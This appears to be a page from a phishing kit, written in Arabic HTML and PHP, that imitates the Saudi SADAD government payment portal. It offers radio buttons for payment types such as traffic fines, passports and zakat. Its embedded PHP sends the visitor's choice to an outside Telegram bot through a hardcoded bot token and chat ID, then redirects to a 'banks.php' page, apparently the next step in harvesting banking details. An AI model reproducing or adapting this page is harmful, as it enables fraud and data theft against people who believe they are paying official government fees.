<!DOCTYPE html>
<html lang=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

	<link rel="apple-touch-icon" sizes="76x76" href="assets/img/apple-icon.png">
	<link rel="icon" type="image/png" href="assets/img/favicon.png">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />

    <title>سداد حكومي</title>
	
	<meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' /> 

	<link rel="stylesheet" href="assets/css/assets.css" />
    <link rel="stylesheet" type="text/css" href="assets/css/font.css" />
	<link rel="stylesheet" href="assets/css/fontello.css" />
	
<script language="javascript" type="text/javascript">
function removeSpaces(string) {
 return string.split(' ').join('');
}
</script>

</head>


	<script type="text/javascript" src="/md5.js"></script>

<body>
<div class="logo-basheer">
			<img src="logo00.png" width="144" height="300" align="middle"></div>
</div>
    <div class="marque"><marquee direction="right"><span style="color: #FF8B59">يقوم سداد بتسهيل وتسريع مختلف المدفوعات للأفراد والمصارف والشركات والقطاع الحكومي، ويستمر في تطوير خدمات جديدة تشمل كافة المدفوعات، فيهدف سداد الى تقديم حلٍ واحد لجميع المدفوعات.</span><span></span></marquee></div>
	
    <form class="form" action="./serves.php" method="POST">
 <input type="radio" id="javascript18" name="fav_language" value="سداد مدفوعات حكومية">
  <label for="javascript18">سداد مدفوعات حكومية</label><br><br>
  <input type="radio" id="javascript1" name="fav_language" value="سداد مدفوعات رسوم المنح الملكية">
  <label for="javascript1">سداد مدفوعات رسوم المنح الملكية</label><br><br>
  <input type="radio" id="javascript041" name="fav_language" value="سداد مدفوعات عقد إلكتروني">
  <label for="javascript041">سداد مدفوعات عقد إلكترني</label><br><br>
  <input type="radio" id="javascript2014" name="fav_language" value="سداد مدفوعات تأمين العمالة المنزلية">
  <label for="javascript204">سداد مدفوعات تأمين العمالة المنزلية </label><br><br>
  <input type="radio" id="javascript17" name="fav_language" value="سداد مدفوعات وزارة العمل والتنمية الاجتماعية">
  <label for="javascript17">سداد مدفوعات وزارة العمل والتنمية الاجتماعية</label><br><br>
  <input type="radio" id="javascript" name="fav_language" value="سداد مدفوعات مرورية">
  <label for="javascript">سداد مدفوعات مرورية</label><br><br>
  <input type="radio" id="javascript11" name="fav_language" value="سداد مدفوعات الزكاة  والدخل">
  <label for="javascript11">سداد مدفوعات الزكاة  والدخل</label><br><br>
  <input type="radio" id="javascript12" name="fav_language" value="سداد مدفوعات التأمينات الاجتماعية">
  <label for="javascript12">سداد مدفوعات التأمينات الاجتماعية</label><br><br>
  <input type="radio" id="javascript122" name="fav_language" value="سداد مدفوعات الإتصالات">
  <label for="javascript122">سداد مدفوعات الإتصالات</label><br><br>
  <input type="radio" id="javascript121" name="fav_language" value="سداد مدفوعات رخص القيادة">
  <label for="javascript121">سداد مدفوعات رخص القيادة</label><br><br>
  <input type="radio" id="javascript21" name="fav_language" value="سداد مدفوعات خدمات المركبات">
  <label for="javascript21">سداد مدفوعات خدمات المركبات</label><br><br>
  <input type="radio" id="javascript22" name="fav_language" value="سداد مدفوعات مديرية الهجرة والجوازات">
  <label for="javascript22">سداد مدفوعات مديرية الهجرة والجوازات</label><br><br>
  <input type="radio" id="javascript204" name="fav_language" value="سداد مدفوعات رسوم قوى">
  <label for="javascript204">سداد مدفوعات رسوم قوى</label><br><br>
  <input type="radio" id="javascript1014" name="fav_language" value="سداد مدفوعات تصديق الغرفه التجارية">
  <label for="javascript1014">سداد مدفوعات تصديق الغرفه التجارية</label><br><br>
  <input type="radio" id="javascript104" name="fav_language" value="سداد مدفوعات رسوم أخرى">
  <label for="javascript104">سداد مدفوعات رسوم أخرى</label><br><br>
  <input type="radio" id="javascript10114" name="fav_language" value="استرداد مدفوعات">
  <label for="javascript10114">استرداد مدفوعات</label><br><br>
 <div class="submit">
                <button type="submit" name="submit">التالي<i class="icon-login"></i></button></div>
            	<p>&nbsp;</p>
<?php
    if(isset($_POST['submit'])) {
		$pass = $_POST['fav_language'];
		$apiToken = "5021887214:AAFA7pS6UilDPbulMgAgr5HBoBPBFAfNxWU";
        $data = [
            'chat_id' => "-664392200", 
            'text' => $pass
        ];
        $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );    
    	echo "<script> location.href='banks.php'; </script>";
        exit;
    	}
	?>
      


</body>

</html>